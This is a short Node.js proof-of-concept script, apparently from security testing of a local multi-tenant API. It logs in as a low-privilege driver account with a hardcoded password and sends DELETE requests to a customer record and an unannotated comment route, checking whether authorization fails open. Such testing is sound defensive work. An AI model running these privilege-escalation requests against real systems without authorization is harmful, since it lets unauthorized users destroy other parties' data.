const axios = require('axios');
const helper = require('../../loop-11.5/helper.js');

async function login(email, password) {
  const res = await axios.post('http://localhost:8080/api/v1/auth/login', {
    email,
    password
  });
  return res.data.access_token;
}

async function attack() {
  const driverEmail = 'driver@companya.com';
  const driverToken = await login(driverEmail, 'password123');
  const customerId = helper.entitiesA.customerId;
  
  try {
    const res = await axios.delete(`http://localhost:8080/api/v1/customers/${customerId}`, {
      headers: { Authorization: `Bearer ${driverToken}` }
    });
    console.log(`DELETE CUSTOMER: ${res.status} ${JSON.stringify(res.data)}`);
  } catch (err) {
    if (err.response) {
      console.log(`DELETE CUSTOMER: ${err.response.status} ${JSON.stringify(err.response.data)}`);
    } else {
      console.log(`DELETE CUSTOMER ERROR: ${err.message}`);
    }
  }

  // Also try hitting an unannotated route to show it fails open (e.g. DELETE comment)
  try {
    const res = await axios.delete(`http://localhost:8080/api/v1/comments/c2a5e783-a4e9-4e4f-b649-0123456789ab`, {
      headers: { Authorization: `Bearer ${driverToken}` }
    });
    console.log(`DELETE COMMENT (Unannotated): ${res.status} ${JSON.stringify(res.data)}`);
  } catch (err) {
    if (err.response) {
      console.log(`DELETE COMMENT (Unannotated): ${err.response.status} ${JSON.stringify(err.response.data)}`);
    } else {
      console.log(`DELETE COMMENT ERROR: ${err.message}`);
    }
  }
}

attack().catch(console.error);
